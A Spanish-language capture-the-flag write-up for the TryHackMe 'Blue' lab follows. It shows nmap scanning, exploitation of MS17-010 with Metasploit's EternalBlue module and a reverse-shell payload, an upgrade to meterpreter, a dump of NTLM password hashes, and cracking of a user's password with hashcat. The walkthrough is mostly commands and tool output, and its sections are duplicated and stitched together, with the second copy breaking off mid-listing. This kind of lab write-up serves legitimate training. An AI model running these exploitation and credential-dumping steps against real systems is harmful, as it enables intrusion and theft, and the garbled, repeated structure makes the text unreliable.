# Blue
## Reconocimiento
### ¿Cuantos puertos tiene abiertos siendo su numero de puerto inferior a 1000?

Para ello realizaremos un escaneo con la herramienta nmap, la cual nos permitirá obtener información sobre la máquina a la cual sometemos al escaneo

```bash
╰─ sudo nmap 10.10.106.146                                                                               
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-24 14:01 CEST
Nmap scan report for 10.10.106.146
Host is up (0.062s latency).
Not shown: 991 closed tcp ports (reset)
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49158/tcp open  unknown
49160/tcp open  unknown
```

Como vemos en este caso nos da 3 puertos por debajo siendo estos

> - 135
> - 139
> - 445

Ahora pasaremos a la siguiente pregunta
# Blue

[Blue](https://tryhackme.com/room/blue) es una máquina **windows** con algunas configuraciones mal realizadas, las cuáles explotaremos en esta sala y tendremos que encontrar tres banderas para poder completarla

## Reconocimiento

### ¿Cuantos puertos tiene abiertos siendo su numero de puerto inferior a 1000?

Para ello vamos a escanear la máquina con la herramienta [nmap](https://nmap.org/npsl/) siendo esta una herramienta gratuita diseñada para el descubrimiento de redes y la auditoría de seguridad, la cual nos permitirá obtener información de los puertos sobre la máquina a la cual sometemos al escaneo

```bash
╰─ sudo nmap 10.10.106.146                                                                               
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-24 14:01 CEST
Nmap scan report for 10.10.106.146
Host is up (0.062s latency).
Not shown: 991 closed tcp ports (reset)
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49158/tcp open  unknown
49160/tcp open  unknown
```

Como vemos en este caso nos da 3 puertos por debajo siendo estos

> - 135
> - 139
> - 445

Ahora pasaremos a la siguiente pregunta

### ¿A que es vulnerable esta máquina?

Para poder obtener a que es vulnerable esta máquina utilizaremos la misma herramienta que para el apartado anterior, pero le añadiremos una opción para que escanee vulnerabilidades

```bash
╰─ sudo nmap --script=vuln 10.10.106.146                                                                 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-24 14:07 CEST
Nmap scan report for 10.10.106.146
Host is up (0.056s latency).
Not shown: 991 closed tcp ports (reset)
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49158/tcp open  unknown
49160/tcp open  unknown

Host script results:
|_smb-vuln-ms10-054: false
| smb-vuln-ms17-010:
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|
|     Disclosure date: 2017-03-14
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|_      https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED
|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED

Nmap done: 1 IP address (1 host up) scanned in 96.68 seconds
```

Como podemos ver, nos da que esta maquina es vulnerable al CVE-2017-0143, el cual se refiere a la vulnerabilidad ms17-010

## Acceso

### Iniciar Metasploit

Vamos a iniciar la plataforma Metasploit Framework para poder realizar el acceso a la máquina

```
╰─ msfconsole                                                                                                        


      .:okOOOkdc'           'cdkOOOko:.
    .xOOOOOOOOOOOOc       cOOOOOOOOOOOOx.
   :OOOOOOOOOOOOOOOk,   ,kOOOOOOOOOOOOOOO:
  'OOOOOOOOOkkkkOOOOO: :OOOOOOOOOOOOOOOOOO'
  oOOOOOOOO.MMMM.oOOOOoOOOOl.MMMM,OOOOOOOOo
  dOOOOOOOO.MMMMMM.cOOOOOc.MMMMMM,OOOOOOOOx
  lOOOOOOOO.MMMMMMMMM;d;MMMMMMMMM,OOOOOOOOl
  .OOOOOOOO.MMM.;MMMMMMMMMMM;MMMM,OOOOOOOO.
   cOOOOOOO.MMM.OOc.MMMMM'oOO.MMM,OOOOOOOc
    oOOOOOO.MMM.OOOO.MMM:OOOO.MMM,OOOOOOo
     lOOOOO.MMM.OOOO.MMM:OOOO.MMM,OOOOOl
      ;OOOO'MMM.OOOO.MMM:OOOO.MMM;OOOO;
       .dOOo'WM.OOOOocccxOOOO.MX'xOOd.
         ,kOl'M.OOOOOOOOOOOOO.M'dOk,
           :kk;.OOOOOOOOOOOOO.;Ok:
             ;kOOOOOOOOOOOOOOOk:
               ,xOOOOOOOOOOOx,
                 .lOOOOOOOl.
                    ,dOd,
                      .

       =[ metasploit v6.2.36-dev                          ]
+ -- --=[ 2277 exploits - 1194 auxiliary - 408 post       ]
+ -- --=[ 951 payloads - 45 encoders - 11 nops            ]
+ -- --=[ 9 evasion                                       ]

Metasploit tip: Use sessions -1 to interact with the
last opened session
Metasploit Documentation: https://docs.metasploit.com/

msf6 >
```

### ¿Cuál es el código de explotación?

Para poder encontrar el código vamos a realizar una búsqueda en la plataforma msfconsole

```bash
msf6 > search ms17_010

Matching Modules
================

   #  Name                                      Disclosure Date  Rank     Check  Description
   -  ----                                      ---------------  ----     -----  -----------
   0  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   1  exploit/windows/smb/ms17_010_psexec       2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   2  auxiliary/admin/smb/ms17_010_command      2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   3  auxiliary/scanner/smb/smb_ms17_010                         normal   No     MS17-010 SMB RCE Detection


Interact with a module by name or index. For example info 3, use 3 or use auxiliary/scanner/smb/smb_ms17_010

msf6 > use 0
[*] Using configured payload windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms17_010_eternalblue) >
```

Por lo que el código de explotación es 

> exploit/windows/smb/ms17_010_eternalblue

### Establecer las opciones

Para ver todas las opciones de este módulo utilizaremos el comando show options

```
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS                          yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wi
                                             ki/Using-Metasploit
   RPORT          445              yes       The target port (TCP)
   SMBDomain                       no        (Optional) The Windows domain to use for authentication. Only affects Win
                                             dows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target machin
                                             es.
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target. Only affects Windows
                                              Server 2008 R2, Windows 7, Windows Embedded Standard 7 target machines.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target. Only affects Windows Server 20
                                             08 R2, Windows 7, Windows Embedded Standard 7 target machines.


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     172.20.204.210   yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Target

```

Para este ataque vamos a establecer el único requisito para que funcione el exploit

```
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 10.10.106.146
RHOSTS => 10.10.106.146
```

También en este caso tryhackme nos pide que especifiquemos el siguiente payload

```
set payload windows/x64/shell/reverse_tcp
```

Y al escribir el comando para ejecutar el exploit ocurre lo siguiente

```
msf6 exploit(windows/smb/ms17_010_eternalblue) > run

[*] Started reverse TCP handler on 10.8.19.67:5377 
[*] 10.10.232.218:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.10.232.218:445     - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 10.10.232.218:445     - Scanned 1 of 1 hosts (100% complete)
[+] 10.10.232.218:445 - The target is vulnerable.
[*] 10.10.232.218:445 - Connecting to target for exploitation.
[+] 10.10.232.218:445 - Connection established for exploitation.
[+] 10.10.232.218:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.10.232.218:445 - CORE raw buffer dump (42 bytes)
[*] 10.10.232.218:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
[*] 10.10.232.218:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
[*] 10.10.232.218:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
[+] 10.10.232.218:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.10.232.218:445 - Trying exploit with 12 Groom Allocations.
[*] 10.10.232.218:445 - Sending all but last fragment of exploit packet
[*] 10.10.232.218:445 - Starting non-paged pool grooming
[+] 10.10.232.218:445 - Sending SMBv2 buffers
[+] 10.10.232.218:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 10.10.232.218:445 - Sending final SMBv2 buffers.
[*] 10.10.232.218:445 - Sending last fragment of exploit packet!
[*] 10.10.232.218:445 - Receiving response from exploit packet
[+] 10.10.232.218:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.10.232.218:445 - Sending egg to corrupted connection.
[*] 10.10.232.218:445 - Triggering free of corrupted buffer.
[*] Sending stage (336 bytes) to 10.10.232.218
[*] Command shell session 1 opened (10.8.19.67:5377 -> 10.10.232.218:49172) at 2023-04-24 16:31:21 +0200
[+] 10.10.232.218:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.232.218:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.232.218:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=


Shell Banner:
Microsoft Windows [Version 6.1.7601]
-----
          

C:\Windows\system32>

```

Como podemos ver ya tenemos acceso a la máquina(Si no funciona prueba a cambiar el LPORT, por si acaso ya esta siendo utilizado). Ahora tenemos que mandar la sesión que acabamos de crear a segundo plano, para poder hacer el siguiente paso

```
C:\Windows\system32>background

Background session 1? [y/N]  y
msf6 exploit(windows/smb/ms17_010_eternalblue) > 
```

## Escalada de privilegios

Esta técnica vamos a pretender obtener permisos de administrador sobre la sesión que hemos obtenido anteriormente.

### ¿Que módulo se usará para la escalada de privilegios?

Utilizaremos el siguiente módulo de metasploit

```
msf6 > search shell_to_meterpreter

Matching Modules
================

   #  Name                                    Disclosure Date  Rank    Check  Description
   -  ----                                    ---------------  ----    -----  -----------
   0  post/multi/manage/shell_to_meterpreter                   normal  No     Shell to Meterpreter Upgrade


Interact with a module by name or index. For example info 0, use 0 or use post/multi/manage/shell_to_meterpreter

msf6 > use 0

msf6 post(multi/manage/shell_to_meterpreter) > 
```

### ¿Que opción tenemos que modificar en este módulo?

Para ver todas las opciones de este módulo utilizaremos el comando show options

```
msf6 post(multi/manage/shell_to_meterpreter) > show options

Module options (post/multi/manage/shell_to_meterpreter):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   HANDLER  true             yes       Start an exploit/multi/handler to receive the connection
   LHOST                     no        IP of host that will receive the connection from the payload (Will try to auto
                                       detect).
   LPORT    4433             yes       Port for payload to connect to.
   SESSION                   yes       The session to run this module on


View the full module info with the info, or info -d command.
```

La opción que tendremos que modificar es SESSION, y le pondremos el número de la sesión que nos ha generado el comando anterior Background

```
msf6 post(multi/manage/shell_to_meterpreter) > set SESSION 1
SESSION => 1
msf6 post(multi/manage/shell_to_meterpreter) > run

[*] Upgrading session ID: 1
[*] Starting exploit/multi/handler
[*] Started reverse TCP handler on 10.8.19.67:2029 
[*] Post module execution completed
[*] Sending stage (200774 bytes) to 10.10.232.218
[*] Meterpreter session 2 opened (10.8.19.67:2029 -> 10.10.232.218:49198) at 2023-04-24 16:49:40 +0200
[*] Stopping exploit/multi/handler

```

Como podemos ver ya tenemos creada una shell meterpreter, la cual tiene privilegios de administrador sobre la máquina. Así que ahora viene el siguiente paso

## Crackear

Este paso nos va a permitir el obtener el usuario y contraseña de la máquina

### ¿Cual es el nombre del usuario que no esta por defecto?

Para poder empezar tendremos que dirigirnos a la sesión que nos ha generado el módulo que acabamos de ejecutar, para ello ponemos lo siguiente

```
msf6 post(multi/manage/shell_to_meterpreter) > sessions 2
[*] Starting interaction with 2...

meterpreter > 
```

En mi caso es la sesión 2, para el tuyo tienes que fijarte en lo que te diga el módulo anterior cuando termine de ejecutarse.

Para poder obtener el nombre de usuario usaremos el comando hashdump, el cual nos da el siguiente resultado

```
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
```

Como podemos ver el usuario que no esta por defecto es Jon

### ¿Cuál es la contraseña de Jon?

Para poder obtener la contraseña de Jon, primero tendremos que crackearla, para ello copiaremos el contenido del hashdump en un fichero y usaremos la herramienta de crackeo de contraseñas Hashcat, para que funcione le tendremos que poner los siguientes parámetros

```
hashcat -m 1000 hashblue /usr/share/wordlists/rockyou.txt
```

> -m 1000 # Es el número identificativo del hash en este caso es un hash NTLM
>
> hashblue # Es el nombre del fichero el cual contiene las contraseñas 
>
> /usr/share/wordlists/rockyou.txt # Es el diccionario que contiene muchisimas contraseñas, necesario para que el crackeo funcione. Si no te aparece, prueba a poner wordlists en tu terminal, o simplemente descomprimelo con gzip -d 

Al ejecutar esta herramienta nos da el siguiente resultado

```
ffb43f0de35be4d9917ac0cc8ad57f8d:alqfna22
```

Por lo tanto ya sabemos que la contraseña de Jon es alqfna22, y ya estaría terminada esta parte, ya solo queda la última, la cual es

## Encuentra las banderas

En esta máquina se encuentran tres banderas, vamos a encontrarlas y listaremos su contenido con el comando cat

```
meterpreter > cat flag2.txt
flag{XXXX} # En este caso no muestro la flag para que la encontreis vosotros, el contenido cambiado son las XXXX, en vuestro caso será el contenido de la flag
```

### 1. Esta bandera se encuentra en la raíz del sistema

El lugar al que se refiere es a la propia raíz del sistema en el que nos encontramos, para ello primero nos tendremos que dirigir hacia esa ruta

```
meterpreter > cd ../../
meterpreter > ls
Listing: C:\
============

Mode              Size   Type  Last modified              Name
----              ----   ----  -------------              ----
040777/rwxrwxrwx  0      dir   2018-12-13 04:13:36 +0100  $Recycle.Bin
040777/rwxrwxrwx  0      dir   2009-07-14 07:08:56 +0200  Documents and Settings
040777/rwxrwxrwx  0      dir   2009-07-14 05:20:08 +0200  PerfLogs
040555/r-xr-xr-x  4096   dir   2019-03-17 23:22:01 +0100  Program Files
040555/r-xr-xr-x  4096   dir   2019-03-17 23:28:38 +0100  Program Files (x86)
040777/rwxrwxrwx  4096   dir   2019-03-17 23:35:57 +0100  ProgramData
040777/rwxrwxrwx  0      dir   2018-12-13 04:13:22 +0100  Recovery
040777/rwxrwxrwx  4096   dir   2019-03-17 23:35:55 +0100  System Volume Information
040555/r-xr-xr-x  4096   dir   2018-12-13 04:13:28 +0100  Users
040777/rwxrwxrwx  16384  dir   2023-01-26 12:26:04 +0100  Windows
100666/rw-rw-rw-  24     fil   2019-03-17 20:27:21 +0100  flag1.txt
000000/---------  0      fif   1970-01-01 01:00:00 +0100  hiberfil.sys
000000/---------  0      fif   1970-01-01 01:00:00 +0100  pagefile.sys
```

### 2. Esta bandera se encuentra donde se suelen guardar las contraseñas en Windows

El lugar al que se refiere es al directorio config de System32, en este caso aparecen muchos más ficheros y esta escondida

```
meterpreter > cd ../../Windows/System32/config
meterpreter > ls
Listing: C:\Windows\System32\config
===================================

Mode              Size      Type  Last modified              Name
----              ----      ----  -------------              ----
100666/rw-rw-rw-  34        fil   2019-03-17 20:32:48 +0100  flag2.txt
```

### 3. Esta bandera se encuentra donde los Administradores suelen tener cosas interesantes guardadas

El lugar al que se refiere es a los documentos, ya que ahí pueden llegar a tener información que solo quiere tener guardada en su máquina y en este caso es el directorio Documents del usuario Jon

```
meterpreter > cd ../../Users/Jon/Documents
meterpreter > ls
Listing: C:\Users\Jon\Documents
===============================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
040777/rwxrwxrwx  0     dir   2018-12-13 04:13:31 +0100  My Music
040777/rwxrwxrwx  0     dir   2018-12-13 04:13:31 +0100  My Pictures
040777/rwxrwxrwx  0     dir   2018-12-13 04:13:31 +0100  My Videos
100666/rw-rw-rw-  402   fil   2018-12-13 04:13:48 +0100  desktop.ini
100666/rw-rw-rw-  37    fil   2019-03-17 20:26:36 +0100  flag3.txt
```


### ¿A que es vulnerable esta máquina?

Para poder obtener a que es vulnerable esta máquina utilizaremos la misma herramienta que para el apartado anterior, pero le añadiremos una opción para que escanee vulnerabilidades

```bash
╰─ sudo nmap --script=vuln 10.10.106.146                                                                 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-24 14:07 CEST
Nmap scan report for 10.10.106.146
Host is up (0.056s latency).
Not shown: 991 closed tcp ports (reset)
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49158/tcp open  unknown
49160/tcp open  unknown

Host script results:
|_smb-vuln-ms10-054: false
| smb-vuln-ms17-010:
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|
|     Disclosure date: 2017-03-14
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|_      https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED
|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED

Nmap done: 1 IP address (1 host up) scanned in 96.68 seconds
```

Como podemos ver, nos da que esta maquina es vulnerable al CVE-2017-0143, el cual se refiere a la vulnerabilidad ms17-010

## Acceso
### Metasploit

Vamos a iniciar la plataforma para poder realizar el acceso a la máquina

```
╰─ msfconsole                                                                                                        


      .:okOOOkdc'           'cdkOOOko:.
    .xOOOOOOOOOOOOc       cOOOOOOOOOOOOx.
   :OOOOOOOOOOOOOOOk,   ,kOOOOOOOOOOOOOOO:
  'OOOOOOOOOkkkkOOOOO: :OOOOOOOOOOOOOOOOOO'
  oOOOOOOOO.MMMM.oOOOOoOOOOl.MMMM,OOOOOOOOo
  dOOOOOOOO.MMMMMM.cOOOOOc.MMMMMM,OOOOOOOOx
  lOOOOOOOO.MMMMMMMMM;d;MMMMMMMMM,OOOOOOOOl
  .OOOOOOOO.MMM.;MMMMMMMMMMM;MMMM,OOOOOOOO.
   cOOOOOOO.MMM.OOc.MMMMM'oOO.MMM,OOOOOOOc
    oOOOOOO.MMM.OOOO.MMM:OOOO.MMM,OOOOOOo
     lOOOOO.MMM.OOOO.MMM:OOOO.MMM,OOOOOl
      ;OOOO'MMM.OOOO.MMM:OOOO.MMM;OOOO;
       .dOOo'WM.OOOOocccxOOOO.MX'xOOd.
         ,kOl'M.OOOOOOOOOOOOO.M'dOk,
           :kk;.OOOOOOOOOOOOO.;Ok:
             ;kOOOOOOOOOOOOOOOk:
               ,xOOOOOOOOOOOx,
                 .lOOOOOOOl.
                    ,dOd,
                      .

       =[ metasploit v6.2.36-dev                          ]
+ -- --=[ 2277 exploits - 1194 auxiliary - 408 post       ]
+ -- --=[ 951 payloads - 45 encoders - 11 nops            ]
+ -- --=[ 9 evasion                                       ]

Metasploit tip: Use sessions -1 to interact with the
last opened session
Metasploit Documentation: https://docs.metasploit.com/

msf6 >
```

### ¿Cuál es el código de explotación?

Para poder encontrar el código vamos a realizar una búsqueda en la plataforma msfconsole

```bash
msf6 > search ms17_010

Matching Modules
================

   #  Name                                      Disclosure Date  Rank     Check  Description
   -  ----                                      ---------------  ----     -----  -----------
   0  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   1  exploit/windows/smb/ms17_010_psexec       2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   2  auxiliary/admin/smb/ms17_010_command      2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   3  auxiliary/scanner/smb/smb_ms17_010                         normal   No     MS17-010 SMB RCE Detection


Interact with a module by name or index. For example info 3, use 3 or use auxiliary/scanner/smb/smb_ms17_010

msf6 > use 0
[*] Using configured payload windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms17_010_eternalblue) >
```

Por lo que el código de explotación es 

> exploit/windows/smb/ms17_010_eternalblue

### Establecer las opciones

Para este ataque vamos a establecer el único requisito para que funcione el exploit

```
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 10.10.106.146
RHOSTS => 10.10.106.146
```

También en este caso tryhackme nos pide que especifiquemos el siguiente payload

```
set payload windows/x64/shell/reverse_tcp
```

Y al escribir el comando para ejecutar el exploit ocurre lo siguiente

```
msf6 exploit(windows/smb/ms17_010_eternalblue) > run

[*] Started reverse TCP handler on 10.8.19.67:5377 
[*] 10.10.232.218:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.10.232.218:445     - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 10.10.232.218:445     - Scanned 1 of 1 hosts (100% complete)
[+] 10.10.232.218:445 - The target is vulnerable.
[*] 10.10.232.218:445 - Connecting to target for exploitation.
[+] 10.10.232.218:445 - Connection established for exploitation.
[+] 10.10.232.218:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.10.232.218:445 - CORE raw buffer dump (42 bytes)
[*] 10.10.232.218:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
[*] 10.10.232.218:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
[*] 10.10.232.218:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
[+] 10.10.232.218:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.10.232.218:445 - Trying exploit with 12 Groom Allocations.
[*] 10.10.232.218:445 - Sending all but last fragment of exploit packet
[*] 10.10.232.218:445 - Starting non-paged pool grooming
[+] 10.10.232.218:445 - Sending SMBv2 buffers
[+] 10.10.232.218:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 10.10.232.218:445 - Sending final SMBv2 buffers.
[*] 10.10.232.218:445 - Sending last fragment of exploit packet!
[*] 10.10.232.218:445 - Receiving response from exploit packet
[+] 10.10.232.218:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.10.232.218:445 - Sending egg to corrupted connection.
[*] 10.10.232.218:445 - Triggering free of corrupted buffer.
[*] Sending stage (336 bytes) to 10.10.232.218
[*] Command shell session 1 opened (10.8.19.67:5377 -> 10.10.232.218:49172) at 2023-04-24 16:31:21 +0200
[+] 10.10.232.218:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.232.218:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.232.218:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=


Shell Banner:
Microsoft Windows [Version 6.1.7601]
-----
          

C:\Windows\system32>

```

Como podemos ver ya tenemos acceso a la máquina(Si no funciona prueba a cambiar el LPORT, por si acaso ya esta siendo utilizado). Ahora tenemos que mandar la sesión que acabamos de crear a segundo plano, para poder hacer el siguiente paso

```
C:\Windows\system32>background

Background session 1? [y/N]  y
msf6 exploit(windows/smb/ms17_010_eternalblue) > 
```

## Escalada de privilegios

Este ataque nos permitirá obtener permisos de administrador sobre la sesión que hemos obtenido anteriormente.

### ¿Que módulo se usará para la escalada de privilegios?

Utilizaremos el siguiente módulo de metasploit

```
msf6 > search shell_to_meterpreter

Matching Modules
================

   #  Name                                    Disclosure Date  Rank    Check  Description
   -  ----                                    ---------------  ----    -----  -----------
   0  post/multi/manage/shell_to_meterpreter                   normal  No     Shell to Meterpreter Upgrade


Interact with a module by name or index. For example info 0, use 0 or use post/multi/manage/shell_to_meterpreter

msf6 > use 0

msf6 post(multi/manage/shell_to_meterpreter) > 
```

### ¿Que opción tenemos que modificar en este módulo?

La opción que tendremos que modificar es SESSION, y le pondremos el número de la sesión que nos ha generado el comando anterior Background

```
msf6 post(multi/manage/shell_to_meterpreter) > set SESSION 1
SESSION => 1
msf6 post(multi/manage/shell_to_meterpreter) > run

[*] Upgrading session ID: 1
[*] Starting exploit/multi/handler
[*] Started reverse TCP handler on 10.8.19.67:2029 
[*] Post module execution completed
[*] Sending stage (200774 bytes) to 10.10.232.218
[*] Meterpreter session 2 opened (10.8.19.67:2029 -> 10.10.232.218:49198) at 2023-04-24 16:49:40 +0200
[*] Stopping exploit/multi/handler

```

Como podemos ver ya tenemos creada una shell meterpreter, la cual tiene privilegios de administrador sobre la máquina. Así que ahora viene el siguiente paso

## Crackear

Este paso nos va a permitir el obtener el usuario y contraseña de la máquina

### ¿Cual es el nombre del usuario que no esta por defecto?

Para poder empezar tendremos que dirigirnos a la sesión que nos ha generado el módulo que acabamos de ejecutar, para ello ponemos lo siguiente

```
msf6 post(multi/manage/shell_to_meterpreter) > sessions 2
[*] Starting interaction with 2...

meterpreter > 
```

En mi caso es la sesión 2, para el tuyo tienes que fijarte en lo que te diga el módulo anterior cuando termine de ejecutarse.

Para poder obtener el nombre de usuario usaremos el comando hashdump, el cual nos da el siguiente resultado

```
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
```
Como podemos ver el usuario que no esta por defecto es Jon
### ¿Cuál es la contraseña de Jon?

Para poder obtener la contraseña de Jon, primero tendremos que crackearla, para ello copiaremos el contenido del hashdump en un fichero y usaremos la herramienta de crackeo de contraseñas Hashcat, para que funcione le tendremos que poner los siguientes parámetros

```
hashcat -m 1000 hashblue /usr/share/wordlists/rockyou.txt
```

> -m 1000 # Es el número identificativo del hash en este caso es un hash NTLM
>
> hashblue # Es el nombre del fichero el cual contiene las contraseñas 
>
> /usr/share/wordlists/rockyou.txt # Es el diccionario que contiene muchisimas contraseñas, necesario para que el crackeo funcione. Si no te aparece, prueba a poner wordlists en tu terminal, o simplemente descomprimelo con gzip -d 

Al ejecutar esta herramienta nos da el siguiente resultado

```
ffb43f0de35be4d9917ac0cc8ad57f8d:alqfna22
```

Por lo tanto ya sabemos que la contraseña de Jon es alqfna22, y ya estaría terminada esta parte, ya solo queda la última, la cual es

## Encuentra las banderas

En esta máquina se encuentran tres banderas, vamos a encontrarlas y listaremos su contenido con el comando cat

```
meterpreter > cat flag2.txt
flag{XXXX} # En este caso no muestro la flag para que la encontreis vosotros
```

### 1. Esta bandera se encuentra en la raíz del sistema

El lugar al que se refiere es a la propia raíz del sistema en el que nos encontramos, para ello primero nos tendremos que dirigir hacia esa ruta

```
meterpreter > cd ../../
meterpreter > ls
Listing: C:\
============

Mode              Size   Type  Last modified              Name
----              ----   ----  -------------              ----
040777/rwxrwxrwx  0      dir   2018-12-13 04:13:36 +0100  $Recycle.Bin
040777/rwxrwxrwx  0      dir   2009-07-14 07:08:56 +0200  Documents and Settings
040777/rwxrwxrwx  0      dir   2009-07-14 05:20:08 +0200  PerfLogs
040555/r-xr-xr-x  4096   dir   2019-03-17 23:22:01 +0100  Program Files
040555/r-xr-xr-x  4096   dir   2019-03-17 23:28:38 +0100  Program Files (x86)
040777/rwxrwxrwx  4096   dir   2019-03-17 23:35:57 +0100  ProgramData
040777/rwxrwxrwx  0      dir   2018-12-13 04:13:22 +0100  Recovery
040777/rwxrwxrwx  4096   dir   2019-03-17 23:35:55 +0100  System Volume Information
040555/r-xr-xr-x  4096   dir   2018-12-13 04:13:28 +0100  Users
040777/rwxrwxrwx  16384  dir   2023-01-26 12:26:04 +0100  Windows
100666/rw-rw-rw-  24     fil   2019-03-17 20:27:21 +0100  flag1.txt
